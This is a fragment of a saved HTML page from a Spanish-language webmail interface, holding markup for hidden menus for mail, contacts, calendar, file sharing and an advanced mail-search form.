                                                                                    onclick="fnTranslatorBoxSelect(2); fnCancelClick(event)"
                                                                                    value="formal">Formal</a>
        <a href="JavaScript:fnTranslatorBoxSelect(3)" class="menulink">&nbsp;<input type="checkbox" id="TranslatorOpt3"
                                                                                    onclick="fnTranslatorBoxSelect(3); fnCancelClick(event)"
                                                                                    value="recipientsingular">Destinatario
            singular</a>
    </div>


    <div id="divColorCodeColors" style="display:none; overflow:hidden">
    </div>


    <div id="mTranslatorMenu" style="display:none; overflow-y: auto; overflow-x: hidden; max-height: 390px;">
        <a href="JavaScript:fnTranslatorSelect(99)" class="menulink">&nbsp;<input id="rdbTranslatorMenu99"
                                                                                  value="Spanish_English"
                                                                                  checked="checked"
                                                                                  name="rdbTranslatorMenu" type="radio">Espa�ol
            a Ingl�s</a>
        <div id="mNavDirsOptMenudivide" class="MSLine"></div>
        <a href="JavaScript:fnTranslatorSelect(4)" class="menulink">&nbsp;<input id="rdbTranslatorMenu4"
                                                                                 value="English_Spanish"
                                                                                 name="rdbTranslatorMenu" type="radio">Ingl�s
            a Espa�ol</a>
    </div>


    <!-- msg prev -->
    <div id="mSenderOptMenu" style="display:none">
        <a href="JavaScript:fnSenderOpt(0)" class="menulink">&nbsp;Guardar direcci�n</a>
        <a href="JavaScript:fnSenderOpt(1)" class="menulink">&nbsp;Bloquear</a>
        <a href="JavaScript:fnSenderOpt(2)" class="menulink">&nbsp;Establecer regla</a>
        <div class="MSLine"></div>
        <a href="JavaScript:fnSenderOpt(3)" class="menulink">&nbsp;C�digo de color</a>
        <div class="MSLine"></div>
        <a href="JavaScript:fnSenderOpt(4)" class="menulink">&nbsp;Encontrar correo electr�nico del remitente en esta
            carpeta</a>
        <a href="JavaScript:fnSenderOpt(5)" class="menulink">&nbsp;Encontrar correo electr�nico del remitente en todas
            las carpetas</a>
    </div>

    <div id="mMultiTabsOptMenu" style="display:none">
        <a href="JavaScript:fnMultiTabsMenuAction(0)" class="menulink">&nbsp;Contestar</a>
        <a href="JavaScript:fnMultiTabsMenuAction(1)" class="menulink">&nbsp;Contestar a todos</a>
        <a href="JavaScript:fnMultiTabsMenuAction(2)" class="menulink">&nbsp;Reenviar</a>
        <div class="MSLine"></div>
        <a href="JavaScript:fnMultiTabsMenuAction(5)" class="menulink">&nbsp;Cerrar</a>
        <a href="JavaScript:fnMultiTabsMenuAction(6)" class="menulink">&nbsp;Cerrar todas las pesta�as</a>
    </div>

    <!-- Contacts -->
    <div id="mContactsListMenu" style="display:none">
        <a href="JavaScript:fnChangeContactsViewPeople(&#39;0&#39;)" class="menulink">&nbsp;Todo</a>
        <a href="JavaScript:fnChangeContactsViewPeople(&#39;2&#39;)" class="menulink">&nbsp;Gente</a>
        <a href="JavaScript:fnChangeContactsViewPeople(&#39;1&#39;)" class="menulink">&nbsp;Grupos</a>
    </div>

    <div id="mContactsViewtMenu" style="display:none">
        <a href="JavaScript:fnChangeContactsView(&#39;person&#39;)" style="display:none"
           class="menulink">&nbsp;Nombres</a>
        <a href="JavaScript:fnChangeContactsView(&#39;phone&#39;)" class="menulink">&nbsp;Nombres</a>
        <a href="JavaScript:fnChangeContactsView(&#39;card&#39;)" class="menulink">&nbsp;Tarjetas</a>
        <a href="JavaScript:fnChangeContactsView(&#39;birthday&#39;)" class="menulink">&nbsp;Cumplea�os</a>
    </div>


    <div id="mContactsFieldstMenu" style="display:none">
        <a href="JavaScript:fnChangeContactsFields(&#39;work&#39;)" class="menulink">&nbsp;Trabajo</a>
        <a href="JavaScript:fnChangeContactsFields(&#39;home&#39;)" class="menulink">&nbsp;Hogar</a>
    </div>

    <div id="mContactsEmailtMenu" style="display:none">
        <a href="JavaScript:fnContactsEmail(&#39;To&#39;)" class="menulink">&nbsp;Para</a>
        <a href="JavaScript:fnContactsEmail(&#39;Cc&#39;)" class="menulink">&nbsp;Cc</a>
        <a href="JavaScript:fnContactsEmail(&#39;Bcc&#39;)" class="menulink">&nbsp;Cco</a>
    </div>

    <div id="mContactsCheckBoxOptions" style="display:none">
        <a href="JavaScript:fnContactsCheckBoxOpt(&#39;all&#39;)" class="menulink">&nbsp;Todo</a>
        <a href="JavaScript:fnContactsCheckBoxOpt(&#39;people&#39;)" class="menulink">&nbsp;Gente</a>
        <a href="JavaScript:fnContactsCheckBoxOpt(&#39;groups&#39;)" class="menulink">&nbsp;Grupos</a>
        <a href="JavaScript:fnContactsCheckBoxOpt(&#39;none&#39;)" class="menulink">&nbsp;Nada</a>
    </div>

    <div id="mContactsNewOptions" style="display:none; ">
        <a href="JavaScript:fnContactsNewAction(&#39;group&#39;)" class="menulink">&nbsp;Nuevo grupo</a>
        <a href="JavaScript:fnContactsNewAction(&#39;export&#39;)" class="menulink">&nbsp;Importar o exportar
            contactos</a>
    </div>

    <div id="mContactsbtnArrangeBy" style="display:none">
        <a href="JavaScript:fnContactSort(0)" class="menulink sort_contact_home sort_contact_work sort_contact"><img
                id="icoContSort0" class="contacts_sortico" src="./index_files/saved_resource" width="16px" height="16px"
                alt="">&nbsp;Nombre</a>
        <a href="JavaScript:fnContactSort(6)" class="menulink sort_contact_home sort_contact_work sort_contact"><img
                id="icoContSort6" class="contacts_sortico" src="./index_files/saved_resource" width="16px" height="16px"
                alt="">&nbsp;Sobrenombre</a>
        <a href="JavaScript:fnContactSort(28)" class="menulink sort_contact_home sort_contact"><img id="icoContSort28"
                                                                                                    class="contacts_sortico"
                                                                                                    src="./index_files/saved_resource"
                                                                                                    width="16px"
                                                                                                    height="16px"
                                                                                                    alt="">&nbsp;IM
            personal</a>
        <a href="JavaScript:fnContactSort(24)" class="menulink sort_contact_home sort_contact"><img id="icoContSort24"
                                                                                                    class="contacts_sortico"
                                                                                                    src="./index_files/saved_resource"
                                                                                                    width="16px"
                                                                                                    height="16px"
                                                                                                    alt="">&nbsp;Tel�fono
            personal</a>
        <a href="JavaScript:fnContactSort(26)" class="menulink sort_contact_home sort_contact"><img id="icoContSort26"
                                                                                                    class="contacts_sortico"
                                                                                                    src="./index_files/saved_resource"
                                                                                                    width="16px"
                                                                                                    height="16px"
                                                                                                    alt="">&nbsp;Tel�fono
            m�vil</a>
        <a href="JavaScript:fnContactSort(30)" class="menulink sort_contact_home sort_contact"><img id="icoContSort30"
                                                                                                    class="contacts_sortico"
                                                                                                    src="./index_files/saved_resource"
                                                                                                    width="16px"
                                                                                                    height="16px"
                                                                                                    alt="">&nbsp;Cumplea�os</a>
        <a href="JavaScript:fnContactSort(32)" class="menulink sort_contact_home sort_contact"><img id="icoContSort32"
                                                                                                    class="contacts_sortico"
                                                                                                    src="./index_files/saved_resource"
                                                                                                    width="16px"
                                                                                                    height="16px"
                                                                                                    alt="">&nbsp;Aniversario</a>
        <a href="JavaScript:fnContactSort(34)" class="menulink sort_contact_home sort_contact"><img id="icoContSort34"
                                                                                                    class="contacts_sortico"
                                                                                                    src="./index_files/saved_resource"
                                                                                                    width="16px"
                                                                                                    height="16px"
                                                                                                    alt="">&nbsp;Esposa
            / Pareja</a>

        <a href="JavaScript:fnContactSort(12)" class="menulink sort_contact_work sort_contact"><img id="icoContSort12"
                                                                                                    class="contacts_sortico"
                                                                                                    src="./index_files/saved_resource"
                                                                                                    width="16px"
                                                                                                    height="16px"
                                                                                                    alt="">&nbsp;Compa��a</a>
        <a href="JavaScript:fnContactSort(20)" class="menulink sort_contact_work sort_contact"><img id="icoContSort20"
                                                                                                    class="contacts_sortico"
                                                                                                    src="./index_files/saved_resource"
                                                                                                    width="16px"
                                                                                                    height="16px"
                                                                                                    alt="">&nbsp;Tel�fono
            de trabajo</a>
        <a href="JavaScript:fnContactSort(22)" class="menulink sort_contact_work sort_contact"><img id="icoContSort22"
                                                                                                    class="contacts_sortico"
                                                                                                    src="./index_files/saved_resource"
                                                                                                    width="16px"
                                                                                                    height="16px"
                                                                                                    alt="">&nbsp;Directorio
            de la compa��a</a>
        <a href="JavaScript:fnContactSort(24)" class="menulink sort_contact_work sort_contact"><img id="icoContSort24"
                                                                                                    class="contacts_sortico"
                                                                                                    src="./index_files/saved_resource"
                                                                                                    width="16px"
                                                                                                    height="16px"
                                                                                                    alt="">&nbsp;Tel�fono
            del hogar</a>
        <a href="JavaScript:fnContactSort(26)" class="menulink sort_contact_work sort_contact"><img id="icoContSort26"
                                                                                                    class="contacts_sortico"
                                                                                                    src="./index_files/saved_resource"
                                                                                                    width="16px"
                                                                                                    height="16px"
                                                                                                    alt="">&nbsp;Tel�fono
            m�vil</a>

        <a href="JavaScript:fnContactSort(0)" class="menulink sort_contact_name sort_contact"><img id="icoContSort15"
                                                                                                   class="contacts_sortico"
                                                                                                   src="./index_files/saved_resource"
                                                                                                   width="16px"
                                                                                                   height="16px" alt="">&nbsp;Nombre</a>
    </div>

    <!-- contacts view -->
    <div id="mContactsViewEmailopt" style="display:none">
        <a href="JavaScript:fnConctactEmailAs(0)" class="menulink">&nbsp;HTML</a>
        <a href="JavaScript:fnConctactEmailAs(1)" class="menulink" style="display:none">&nbsp;vCard</a>
        <a href="JavaScript:fnConctactEmailAs(2)" class="menulink">&nbsp;Tarjeta de negocios</a>
        <a href="JavaScript:fnConctactEmailAs(3)" class="menulink">&nbsp;Canal RSS</a>

    </div>

    <div id="mContactsViewExportopt" style="display:none">
        <a href="JavaScript:fnContactsExportCSV()" class="menulink">&nbsp;CSV</a>
        <a href="JavaScript:fnContactsExportXML()" class="menulink">&nbsp;XML</a>
    </div>


    <!-- Backpack -->
    <div id="mNavDirsOptMenu" style="display:none">
        <a id="mNavDirsOptMenuNew" href="JavaScript:fnNavDirMenuAction(0)" class="menulink">&nbsp;Nuevo</a>
        <a id="mNavDirsOptMenuRename" href="JavaScript:fnNavDirMenuAction(1)" class="menulink">&nbsp;Renombrar</a>
        <div id="mNavDirsOptMenudivideMain" class="MSLine"></div>
        <a id="mNavDirsOptMenuEmpty" href="JavaScript:fnNavDirMenuAction(2)" style="display:none" class="menulink">&nbsp;Vaciar</a>
        <a id="mNavDirsOptMenuDelete" href="JavaScript:fnNavDirMenuAction(3)" class="menulink">&nbsp;Borrar</a>
        <div id="mNavDirsOptMenudivideRoot" class="MSLine"></div>
        <a id="mNavDirsOptMenuNewRoot" href="JavaScript:fnNavDirMenuAction(10)" class="menulink">&nbsp;Nueva carpeta
            principal</a>
        <a href="JavaScript:fnNavDirMenuAction(11)" class="menulink">&nbsp;Refrescar</a>
    </div>

    <div id="mBackpackViewtMenu" style="display:none">
        <a href="JavaScript:fnChangeBackpackView(&#39;thumbnails&#39;)" class="menulink">&nbsp;Vista en miniatura</a>
        <a href="JavaScript:fnChangeBackpackView(&#39;details&#39;)" class="menulink">&nbsp;Detalles</a>
    </div>


    <div id="mBackpackCheckBoxOptions" style="display:none">
        <a href="JavaScript:fnBackpackCheckBoxOpt(&#39;all&#39;)" class="menulink">&nbsp;Todo</a>
        <a href="JavaScript:fnBackpackCheckBoxOpt(&#39;none&#39;)" class="menulink">&nbsp;Nada</a>
        <a href="JavaScript:fnBackpackCheckBoxOpt(&#39;misc&#39;)" class="menulink" style="display:none">&nbsp;Archivos
            Miscel�neos</a>
        <a href="JavaScript:fnBackpackCheckBoxOpt(&#39;video&#39;)" class="menulink" style="display:none">&nbsp;Archivos
            de Medios</a>
        <a href="JavaScript:fnBackpackCheckBoxOpt(&#39;images&#39;)" class="menulink" style="display:none">&nbsp;Im�genes</a>
    </div>


    <div id="mPopCollectorCheckBoxOptions" style="display:none">
        <a href="JavaScript:fnPopCollectorCheckBoxOpt(&#39;all&#39;)" class="menulink">&nbsp;Todo</a>
        <a href="JavaScript:fnPopCollectorCheckBoxOpt(&#39;none&#39;)" class="menulink">&nbsp;Nada</a>
        <div id="mBackPackDirsOptMenudivide" class="MSLine"></div>
        <a href="JavaScript:fnPopCollectorCheckBoxOpt(&#39;active&#39;)" class="menulink">&nbsp;Activo</a>
        <a href="JavaScript:fnPopCollectorCheckBoxOpt(&#39;disable&#39;)" class="menulink">&nbsp;Deshabilitada</a>
        <div class="MSLine"></div>
        <a href="JavaScript:fnPopCollectorCheckBoxOpt(&#39;auto&#39;)" class="menulink">&nbsp;Auto revisi�n</a>
        <a href="JavaScript:fnPopCollectorCheckBoxOpt(&#39;manual&#39;)" class="menulink">&nbsp;Revisi�n Manual</a>
    </div>


    <div id="mBackPackDirsOptMenu" style="display:none">
        <a href="JavaScript:fnBackPackDirMenuAction(0)" class="menulink">&nbsp;Nuevo</a>
        <a id="mBackPackDirsOptMenuRename" href="JavaScript:fnBackPackDirMenuAction(1)"
           class="menulink">&nbsp;Renombrar</a>
        <div id="mBackPackDirsOptMenudivide" class="MSLine"></div>
        <a id="mBackPackDirsOptMenuDelete" href="JavaScript:fnBackPackDirMenuAction(3)"
           class="menulink">&nbsp;Borrar</a>
    </div>


    <div id="mBackPackFileOptMenu" style="display:none">
        <a id="mBackPackFileOptMenuRename" href="JavaScript:fnBackPackFileMenuAction(0)" class="menulink">&nbsp;Renombrar</a>
        <div class="MSLine"></div>
        <a id="mBackPackFileOptMenuDelete" href="JavaScript:fnBackPackFileMenuAction(1)"
           class="menulink">&nbsp;Borrar</a>
    </div>


    <div id="mBackPackShareOptMenu" style="display:none">
        <a href="JavaScript:fnBackPackSendFile(0)" class="menulink">&nbsp;<img
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/email_16.png"
                src="https://www.infinitummail.com/app/" class="jqTootltip postLoadIMG"
                style="height:16px; height:16px; cursor:pointer">&nbsp;Correo electr�nico</a>
        <a href="JavaScript:fnBackPackSendFile(1)" class="menulink">&nbsp;<img
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/1392175135_icon-20.png"
                src="https://www.infinitummail.com/app/" class="jqTootltip postLoadIMG"
                style="height:16px; height:16px; cursor:pointer">&nbsp;Enviar v�nculos</a>
        <a id="DrivePubShare" href="JavaScript:fnBackPackShareFile(0)" class="menulink">&nbsp;<img
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/1392268816_network_folder.png"
                src="https://www.infinitummail.com/app/" class="jqTootltip postLoadIMG"
                style="height:16px; height:16px; cursor:pointer">&nbsp;Agregar a la Compartidas</a>
        <div id="mBackPackDirsOptMenudivide" class="MSLine"></div>
        <a href="JavaScript:fnBackPackSendFile(7)" class="menulink menusocialDrive">&nbsp;<img
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/facebook_16.png"
                src="https://www.infinitummail.com/app/" class="jqTootltip postLoadIMG"
                style="height:16px; height:16px; cursor:pointer">&nbsp;Facebook</a>
        <a href="JavaScript:fnBackPackSendFile(8)" class="menulink menusocialDrive">&nbsp;<img
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/twitter_16.png"
                src="https://www.infinitummail.com/app/" class="jqTootltip postLoadIMG"
                style="height:16px; height:16px; cursor:pointer">&nbsp;Twitter</a>
        <a href="JavaScript:fnBackPackSendFile(9)" class="menulink menusocialDrive">&nbsp;<img
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/googleplus_16.png"
                src="https://www.infinitummail.com/app/" class="jqTootltip postLoadIMG"
                style="height:16px; height:16px; cursor:pointer">&nbsp;Google+</a>
        <a href="JavaScript:fnBackPackSendFile(10)" class="menulink menusocialDrive">&nbsp;<img
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/linkedin_16.png"
                src="https://www.infinitummail.com/app/" class="jqTootltip postLoadIMG"
                style="height:16px; height:16px; cursor:pointer">&nbsp;LinkedIn</a>
        <div id="mBackPackDirsOptMenudivide" class="MSLine"></div>
        <a href="JavaScript:fnBackPackShareFile(1)" class="menulink">&nbsp;Ver mi URL compartida</a>
        <a href="JavaScript:fnBackPackShareFile(2)" class="menulink">&nbsp;Enviar mi URL compartida</a>
    </div>

    <div id="mBackPackShareMiniOptMenu" style="display:none">
        <a href="JavaScript:" class="menulink">
            <img onclick="fnShareImg(4)"
                 data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/email_16.png"
                 src="https://www.infinitummail.com/app/" title="Correo electr�nico" class="jqTootltip postLoadIMG"
                 style="height:16px; height:16px; cursor:pointer">
            &nbsp;&nbsp;&nbsp;<img
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/1392175135_icon-20.png"
                onclick="fnShareImg(5)" src="https://www.infinitummail.com/app/" title="Enviar v�nculos"
                class="jqTootltip postLoadIMG" style="height:16px; height:16px; cursor:pointer">
            &nbsp;&nbsp;&nbsp;<img
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/export_icon&amp;16.png"
                onclick="fnShareImg(12)" src="https://www.infinitummail.com/app/" title="open in a new window"
                class="jqTootltip postLoadIMG" style="height:16px; height:16px; cursor:pointer">
            &nbsp;&nbsp;&nbsp;<img
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/1392268816_network_folder.png"
                onclick="fnShareImg(6)" src="https://www.infinitummail.com/app/" title="Agregar a la Compartidas"
                class="jqTootltip postLoadIMG" style="height:16px; height:16px; cursor:pointer">
            &nbsp;&nbsp;&nbsp;<img
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/facebook_16.png"
                src="https://www.infinitummail.com/app/" onclick="fnShareImg(7)" title="Facebook"
                class="jqTootltip postLoadIMG" style="height:16px; height:16px; cursor:pointer">
            &nbsp;&nbsp;&nbsp;<img
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/twitter_16.png"
                onclick="fnShareImg(8)" src="https://www.infinitummail.com/app/" title="Twitter"
                class="jqTootltip postLoadIMG" style="height:16px; height:16px; cursor:pointer">
            &nbsp;&nbsp;&nbsp;<img
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/googleplus_16.png"
                onclick="fnShareImg(9)" src="https://www.infinitummail.com/app/" title="Google+"
                class="jqTootltip postLoadIMG" style="height:16px; height:16px; cursor:pointer">
            &nbsp;&nbsp;&nbsp;<img
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/linkedin_16.png"
                onclick="fnShareImg(10)" src="https://www.infinitummail.com/app/" title="LinkedIn"
                class="jqTootltip postLoadIMG" style="height:16px; height:16px; cursor:pointer">
        </a>
    </div>

    <div id="mBackPackDirsList" style="display:none"></div>
    <!-- ---- -->

    <!--  Alias -->
    <div id="mRTEAlias" style="display:none">
    </div>
    <!-- ---- -->

    <!-- MagicBox -->
    <div id="mMBoxCheckBoxOptions" style="display:none">
        <a href="JavaScript:fnMBoxCheckBoxOpt(&#39;All&#39;)" class="menulink">&nbsp;Todo</a>
        <a href="JavaScript:fnMBoxCheckBoxOpt(&#39;None&#39;)" class="menulink">&nbsp;Nada</a>
        <div class="MSLine"></div>
        <a href="JavaScript:fnMBoxCheckBoxOpt(&#39;Photos&#39;)" class="menulink">&nbsp;Fotos</a>
        <a href="JavaScript:fnMBoxCheckBoxOpt(&#39;Videos&#39;)" class="menulink">&nbsp;Videos</a>
        <a href="JavaScript:fnMBoxCheckBoxOpt(&#39;Audio&#39;)" class="menulink">&nbsp;Audio</a>
        <div class="MSLine"></div>
        <a href="JavaScript:fnMBoxCheckBoxOpt(&#39;Other&#39;)" class="menulink">&nbsp;Otro</a>
    </div>

    <div id="mMBoxSortOptions" style="display:none">
        <a href="JavaScript:fnMBoxCheckBoxOpt(&#39;Name&#39;)" class="menulink">&nbsp;Nombre</a>
        <a href="JavaScript:fnMBoxCheckBoxOpt(&#39;Size &#39;)" class="menulink">&nbsp;Tama�o</a>
        <a href="JavaScript:fnMBoxCheckBoxOpt(&#39;Type&#39;)" class="menulink">&nbsp;Tipo</a>
    </div>

    <!-- Calendar -->
    <div id="mCalendarNewOptions" style="display:none; width:165px">
        <a href="JavaScript:fnCalendarNewAction(&#39;reminder&#39;)" class="menulink">&nbsp;Agregar recordatorio</a>
        <a href="JavaScript:fnCalendarNewAction(&#39;task&#39;)" class="menulink">&nbsp;Agregar tarea</a>
        <a href="JavaScript:fnCalendarNewAction(&#39;note&#39;)" class="menulink">&nbsp;Agregar nota</a>
    </div>

    <!--<script>-->
    <!---->
    <!--// CLEARABLE INPUT-->
    <!--jQuery(function($) {-->
    <!---->
    <!---->
    <!--// init plugin (with callback)-->
    <!--$('.clearable').clearSearch({ callback: function() { console.log("cleared"); } } );-->
    <!---->
    <!--// update value-->
    <!--// $('.clearable').val('sample value').change();-->
    <!---->
    <!--// change width-->
    <!--// $('.clearable').width('200px').change();-->
    <!---->
    <!---->
    <!--});	    -->
    <!--</script>-->
    <!---->


    <!-- Mail search popup ---------------------------------------------------------------------------------------------------------------------------------------------->
    <div id="mMailSearchOptMenu" onclick="event.stopPropagation();" style="display:none">

        <form id="MailSearchForm" name="MailSearchForm" action="https://www.infinitummail.com/app/#" method="get">
            <table cellpadding="3" cellspacing="3"
                   style="width: 580px;font-size:12px !important; font-family:Arial, Helvetica, sans-serif;">
                <tbody>
                <tr>
                    <td style="white-space: nowrap; font-weight:bold">Campos</td>
                </tr>
                <tr>
                    <td style="width: 100%;white-space: nowrap;">
                        <input name="RadioearchField" id="RadioearchField0" onclick="fnSearchField(0)" type="radio"
                               value="FROM">&nbsp;De&nbsp;&nbsp;
                        <input name="RadioearchField" id="RadioearchField1" onclick="fnSearchField(1)" type="radio"
                               value="TO">&nbsp;Para&nbsp;&nbsp;
                        <input name="RadioearchField" id="RadioearchField2" onclick="fnSearchField(2)" type="radio"
                               value="CC">&nbsp;Con copia&nbsp;&nbsp;
                        <input name="RadioearchField" id="RadioearchField3" onclick="fnSearchField(3)" type="radio"
                               value="SUBJECT">&nbsp;Asunto&nbsp;&nbsp;
                        <span id="rdbtFullSearch"><input name="RadioearchField" id="RadioearchField4"
                                                         onclick="fnSearchField(4)" checked="checked" value="BODY"
                                                         type="radio">&nbsp;Mensaje completo&nbsp;&nbsp;</span>
                        <div style="display:none"><input name="RadioearchField" id="RadioearchField5"
                                                         onclick="fnSearchField(5)" type="radio" value="TEXT">&nbsp;Encabezado
                            de mensaje&nbsp;&nbsp;
                        </div>
                        <!-- Search mode uad_korney 11/02/2015 -->

                        <select id="s_search_mode" style="display:none;">
                            <option value="default"></option>
                        </select>

                    </td>
                </tr>
                <tr>
                    <td style="white-space: nowrap; font-weight:bold">Fecha</td>
                </tr>
                <tr>
                    <td colspan="2" style="width: 100%;white-space: nowrap; vertical-align:middle;">
                        <input type="checkbox" value="ON" id="s_date_option" onclick="fnMailSearchCheckDate(this)"
                               style="font-size:12px !important; font-family:Arial, Helvetica, sans-serif">
                        <select id="s_restrict_date"
                                style="font-size:12px !important; font-family:Arial, Helvetica, sans-serif">
                            <option value="ON">En</option>
                            <option value="BEFORE">Antes</option>
                            <option value="SINCE">Desde</option>
                            <!-- Additional date criterias  uad_korney 04/29/2015-->
                            <!-- KA: temp. disabled this part-->

                        </select>

                        <select id="s_month" style="font-size:12px !important; font-family:Arial, Helvetica, sans-serif"
                                onchange="document.getElementById(&#39;s_date_option&#39;).checked = true;">
                            <option value="0"> Mes</option>
                            <option value="Jan"> Enero</option>
                            <option value="Feb"> Febrero</option>
                            <option value="Mar"> Marzo</option>
                            <option value="Apr"> Abril</option>
                            <option value="May"> Mayo</option>
                            <option value="Jun"> Junio</option>
                            <option value="Jul"> Julio</option>
                            <option value="Aug"> Agosto</option>
                            <option value="Sep"> Septiembre</option>
                            <option value="Oct"> Octubre</option>
                            <option value="Nov"> Noviembre</option>
                            <option value="Dec"> Diciembre</option>
                        </select>

                        <select style="font-size:12px !important; font-family:Arial, Helvetica, sans-serif" id="s_day"
                                onchange="document.getElementById(&#39;s_date_option&#39;).checked = true;">
                            <option value="0">D�a</option>
                            <option value="1"> 1</option>
                            <option value="2"> 2</option>
                            <option value="3"> 3</option>
                            <option value="4"> 4</option>
                            <option value="5"> 5</option>
                            <option value="6"> 6</option>
                            <option value="7"> 7</option>
                            <option value="8"> 8</option>
                            <option value="9"> 9</option>
                            <option value="10"> 10</option>
                            <option value="11"> 11</option>
                            <option value="12"> 12</option>
                            <option value="13"> 13</option>
                            <option value="14"> 14</option>
                            <option value="15"> 15</option>
                            <option value="16"> 16</option>
                            <option value="17"> 17</option>
                            <option value="18"> 18</option>
                            <option value="19"> 19</option>
                            <option value="20"> 20</option>
                            <option value="21"> 21</option>
                            <option value="22"> 22</option>
                            <option value="23"> 23</option>
                            <option value="24"> 24</option>
                            <option value="25"> 25</option>
                            <option value="26"> 26</option>
                            <option value="27"> 27</option>
                            <option value="28"> 28</option>
                            <option value="29"> 29</option>
                            <option value="30"> 30</option>
                            <option value="31"> 31</option>
                        </select>

                        <select style="font-size:12px !important; font-family:Arial, Helvetica, sans-serif" id="s_year"
                                onchange="document.getElementById(&#39;s_date_option&#39;).checked = true;">
                            <option value="2006">2006</option>
                            <option value="2007">2007</option>
                            <option value="2008">2008</option>
                            <option value="2009">2009</option>
                            <option value="2010">2010</option>
                            <option value="2011">2011</option>
                            <option value="2012">2012</option>
                            <option value="2013">2013</option>
                            <option value="2014">2014</option>
                            <option value="2015">2015</option>
                            <option value="2016">2016</option>
                            <option value="2017">2017</option>
                            <option value="2018" selected="selected">2018</option>
                        </select>
                    </td>
                </tr>
                <tr>
                    <td style="white-space: nowrap; font-weight:bold">Tama�o</td>
                </tr>
                <tr>
                    <td style="width: 100%;white-space: nowrap;">
                        <input type="checkbox" value="ON" id="s_size_option" onclick="fnMailSearchSizeOpt(this)">
                        <select style="font-size:12px !important; font-family:Arial, Helvetica, sans-serif"
                                id="s_restrict_size"
                                onchange="document.getElementById(&#39;s_size_option&#39;).checked = true;">
                            <option value="SMALLER">Menos que</option>
                            <option value="LARGER">M�s grande que</option>
                        </select>
                        <input type="text" id="s_size" value="" size="3" maxlength="5" onchange=""
                               style="font-size:11px; width:40px">&nbsp;KB
                    </td>
                </tr>
                <!-- Messages types criterias  uad_korney 04/29/2015-->

                <tr style="display:none">
                    <td style="white-space: nowrap;  font-weight:bold">Tipo</td>
                </tr>
                <tr style="display:none">
                    <td style="width: 100%;white-space: nowrap;">
                        <select id="s_message_type">
                            <option value="ALL">Todo</option>
                            <option value="NEW">Solo nuevo</option>
                            <option value="ANSWERED">Solo contestado</option>
                            <option value="FLAGGED">Solo reenviado</option>
                        </select>
                    </td>
                </tr>

                <tr>
                    <td style="white-space: nowrap; font-weight:bold; padding-top:5px">Carpetas</td>
                </tr>
                <tr>
                    <td style="width: 100%;white-space: nowrap;">
                        <div id="pgSearchFoldersID"
                             style="border:1px #E1E1E1 solid; max-height:110px !important ; overflow:auto; color: #8A8A8A; width:99%; margin-left:0px; padding-top:3px; font-size:12px !important; font-family:Arial, Helvetica, sans-serif">
                            <!-- === Left Panel Folders HTML ==== -->
                            <div style="text-align:center">Cargando...</div>
                        </div>

                    </td>
                </tr>
                </tbody>
            </table>
        </form>

        <div id="" style=" color:#fff; padding:10px ; margin-top:5px">
            <div style="display:inline-block; float:left; font-weight:normal;color:#708194;"></div>
            <div style="display:inline-block; float:right; padding-bottom:3px;">
                <a id="SearchAdvancedBtn" href="JavaScript:CurentPage =1; fnmDoSearch()" class="buttonSnd">Buscar</a>&nbsp;&nbsp;&nbsp;&nbsp;<a
                    href="JavaScript:fnSearchClose()" id="SearchAdvancedCloseBtn" class="yui3-button">Cerrar</a>
            </div>
        </div>

    </div>
    <!-- Mail search popup ENDS  ---------------------------------------------------------------------------------------------------------------------------------------------->
    <!-- Mail search popup ----------------------------------------------------------------
   <div id="mMailSearchOptMenu" onclick="event.stopPropagation();" style="display:none"></div>
   -->
</div>

<div style="display:none; height:25px; line-height:25px; position:absolute; text-overflow:ellipsis; overflow:hidden; white-space:nowrap; z-index:1001; border:1px #CCCCCC solid; background-color:#fff; font-family:arial, helvetica, sans-serif; font-size: 11px; color: #545454;-moz-box-shadow: 2px 2px 2px #CACACA;-webkit-box-shadow: 2px 2px 2px #CACACA;box-shadow: 2px 2px 2px #CACACA;"
     id="DragDIVID">&nbsp;&nbsp;<img height="16" id="icoDragnDropInbox" alt="" src="./index_files/no_drop_16.png"
                                     width="16" align="middle">&nbsp;&nbsp;<span id="dragndrop_span">Drag to a folder or the Reading Pane</span>&nbsp;&nbsp;
</div>
<!-- ::::: DROP MENUS  ENDS  ::::: -->

<!-- ::::: FILTERS FROM-EMAILS AUTOCOMP DROP MENUS  STARTS  ::::: -->
<div id="mPOPOptFiltersFromEmails" class="skin0"
     style="position: absolute; left: 0px; top: 0px; padding: 7px; z-index: 1003; visibility: hidden;">
    <div id="mFilterFromEmailsAutoCompMenu" style=""></div>
</div>
<!-- ::::: FILTERS FROM-EMAILS AUTOCOMP DROP MENUS  ENDS  ::::: -->


<!-- ::::: Contacts View Page STARTS  ::::: -->
<div id="divContactsView" class="MsgpreFullscreen"
     style="position:absolute;z-index:101;display:none; background-color:#fff; padding-top:0px ;">
    <div id="mContactMainPanelHead"
